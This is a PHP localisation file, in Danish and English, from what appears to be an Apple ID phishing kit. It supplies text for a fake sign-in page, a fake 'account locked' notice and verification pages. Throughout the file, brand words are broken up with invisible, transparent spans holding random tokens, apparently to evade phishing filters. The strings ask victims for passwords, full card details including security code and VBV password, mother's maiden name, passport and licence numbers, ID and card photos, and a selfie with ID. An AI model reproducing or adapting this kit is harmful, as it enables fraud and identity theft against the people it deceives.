$ForgotApple = "har du glemt <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID eller adgangskode?"; 
$accounteverything = "din konto til &nbsp; alt &nbsp; <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";  
$services = "et enkelt <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp;-id og en adgangskode giver dig adgang til alle <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-tjenester."; 
$about = "få mere at vide om <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID &nbsp."; 
$CreateApple = "Opret dit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp;-id"; 
$Shopthe = "shop"; 
$OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> online store"; 
$Visit = "besøg en"; 
$RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Retail store"; 
$Find = "eller Find en"; 
$Reseller = "forhandler"; 
$AppleInfo = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-info"; 
$Map = "overSigt over websted"; 
$News = "hot News"; 
$Feeds = "RSS-feeds"; 
$Contact = "Kontakt os"; 
$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Alle rettigheder forbeholdes. "; 
$TermsUse = "vilkår for anvendelse"; 
$Policy = "fortrolighedspolitik"; 
$accManageount = "Administrer din <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-konto <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id"; 
$acApplecount = "Administrer din <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-konto"; 
$Password = "adgangskode"; 
$Rmeemember = "Husk mig"; 
$morehelp = "har du brug for mere hjælp?"; 
$Chatnow = "chat nu"; 
$M800YAPPLE = "eller ring til 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$cfasterheckout = "Log ind for hurtigere udtjekning"; 
$iCsaddressignloud = "dit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-ID er den mailadresse, du bruger til at logge på <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, app store og <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>."; 
$ISignn = "Log ind"; 
$pForgotassword = "har du glemt dit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id eller din adgangskode?"; 
$unpassworddefined = "har du glemt dit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id eller din adgangskode? ikke defineret "; 
$Creatonee = "har du ikke et <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id? Opret en nu. "; 
$haveCApplereate = "har du ikke et <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id? Opret en nu. ikke defineret "; 
$IApplesD = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id"; 
$fAqqq = "FAQ"; 
$securityreasons = "dette <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id er blevet låst af sikkerhedsmæssige årsager."; 
$beforesigning = "du skal låse din konto op, før du logger ind."; 
$UnlockAccount = "lås konto op"; 
$yourinformation = "Bekræft dine oplysninger"; 
$AccountVerification = "konto verifikation"; 
$YourAppleID = "dit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-id er"; 
$OuSignt = "Log ud"; 
$PersonalInformation = "personlige oplysninger"; 
$NAME = "navn"; 
$FirstName = "Fornavn"; 
$middlename = "mellemnavn (valgfrit)"; 
$LastName = "efter navn"; 
$OFBIRTH = "FØDSELSDATO"; 
$dateobirth = "fødselsdato";  
$TELEPHONE = "TELEFON"; 
$rtphone = "telefonnummer"; 
$ADDRESS = "ADRESSE"; 
$LineADDRESS = "adresselinje"; 
$City = "by"; 
$POSTCO = "POSTNUMMER"; 
$AccountDetails = "kontooplysninger"; 
$CARDDETAILS = "kortoplysninger"; 
$CAname = "navn på kortindehaver"; 
$CAnumber = "kortnummer"; 
$CAdater = "udløbsdato"; 
$securitycode = "sikkerhedskode for kort"; 
$cardpassword = "VBV adgangskode eller kort adgangskode"; 
$Security = "sikkerhed"; 
$SELECTQUESTION = "Vælg et sikkerhedsspørgsmål"; 
$securityquestion = "Vælg sikkerhedsspørgsmål"; 
$MaideNamen = "Moder ' s Maiden Name"; 
$LicenseNumber = "kørekort nummer"; 
$PassportNumber = "pasnummer"; 
$answer = "svar"; 
$IdentityVerification = "identitetsverifikation"; 
$doIDcument = "1-Upload billeder af begge sider af dit ID-dokument.";  
$residencedocument = "2-upload bevis for opholdsdokument foto"; 
$couldyour = "Dette kunne være din:"; 
$billinternet = "kontoudtog eller Utility Bill (elregningen, vandregningen, Internet regningen, osv.)"; 
$Email = "E-mail"; 
$fsidedocument = "-forsiden af dit ID-dokument"; 
$Backside = "-bagsiden af dit ID-dokument"; 
$residencephoto = "-bevis for opholdsdokument foto"; 
$sidespaymentcard = "Upload billeder af begge sider af dit betalingskort. &nbsp;"; 
$FrontsideCard = "-forsiden af dit betalingskort"; 
$syourideBack = "-bagsiden af dit betalingskort"; 
$clearCard = "-upload venligst et klart billede af dit ID-kort"; 
$takeselfie = "-du bør holde dit ID ved siden af dit ansigt og tage en selfie"; 
$thenupload = "Vælg fotoet, og klik derefter på upload."; 
$uploadii = "upload &rarr;"; 
$VerificationComplete = "konto verifikation afsluttet"; 
$accessaccount = "Vent venligst, mens vi gendanner din kontoadgang..."; 
$automaticallylogged = "for din sikkerhed vil du automatisk blive logget ud."; 
$vverrmail = "Tilføj din e-mail-adresse.";  
$emaillsz = "E-mail"; 
$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> gemmer ikke din adgangskode."; 
$itoCloud = "Log ind på <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
$Keepme = "Hold mig logget ind";
$nxt = "næste";
Break;

// >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>




default:
// Front page	
    $TTLEZ = "Sign In";
	$SignIn = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>S<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>g<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span> <span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>I<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n</div>";
	$Createapid = "Create Your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>&nbsp;ID";
	$ForgotApple = "Forgot <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>&nbsp;ID or password?";
	$accounteverything = "Your account for&nbsp;everything&nbsp;<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$services = "A single <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>&nbsp;ID and password gives you access to all <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> services.";
	$about = "Learn more about <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>&nbsp;ID&nbsp;";
	$CreateApple = "Create your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>&nbsp;ID";
	$Shopthe = "Shop the ";
	$OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Online Store";
	$visit = " visit an ";
	$RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Retail Store";
	$find = " or find a ";
	$reseller = "reseller";
	$AppleInfo = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Info";
	$Map = "Site Map";
	$News = "Hot News";
	$Feeds = "RSS Feeds";
	$Contact = "Contact Us";
	$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. All rights reserved.";
	$TermsUse = "Terms of Use";
	$Policy = "Privacy Policy";
	
// Login page
	
	$accManageount = "Manage your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> account <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
	$acApplecount = "Manage your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> account";
	$Password = "Password";
	$Rmeemember = "Remember me";
	$morehelp = "Need more help? ";
	$Chatnow = "Chat now";
	$M800YAPPLE = " or call 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$cfasterheckout = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>S<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>g<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span> <span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>I<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n</div> for faster checkout."; // Other sing
	$iCsaddressignloud = "Your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID is the email address you use to <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>S<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>g<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span> <span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>I<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n</div> to <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, the App Store, and <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>.";
	$ISignn = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>S<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>g<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span> <span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>I<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n</div>";
	$pForgotassword = "Forgot your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID or password?";
	$unpassworddefined = "Forgot your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID or password? undefined";
	$Creatonee = "Don't have an <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID? Create one now.";
	$haveCApplereate = "Don't have an <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID? Create one now. undefined";
	$IApplesD = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
	$fAqqq = "FAQ"; // added new
	$itoCloud = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>S<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>g<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span> <span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>I<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n</div> to <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
	$Keepme = "Keep me signed in";
	$fAqqq = "FAQ";

// Lock	page

	$securityreasons = " This <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID has been locked for security reasons.";
	$beforesigning = "You must unlock your account before signing in.";
	$UnlockAccount = "Unlock Account";
	
// Verify page

    $yourinformation = "Confirm your information";
	$AccountVerification = "Account Verification";
